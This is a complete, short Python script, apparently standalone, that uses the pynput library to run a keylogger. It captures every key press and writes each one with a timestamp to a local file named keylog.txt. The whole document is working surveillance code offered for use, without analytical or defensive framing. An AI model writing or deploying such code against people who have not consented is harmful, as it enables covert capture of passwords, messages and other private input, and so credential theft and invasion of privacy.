from pynput.keyboard import Key, Listener
import logging

# Set up logging to store the key logs into a file
log_dir = ""  # Directory where logs will be saved, leave empty for the current directory
logging.basicConfig(filename=(log_dir + "keylog.txt"), 
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to capture each key press and store it
def on_press(key):
    try:
        logging.info(str(key))  # Log the key pressed
    except:
        pass

# Function to start listening for key presses
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Start the keylogger
if __name__ == "__main__":
    start_keylogger()

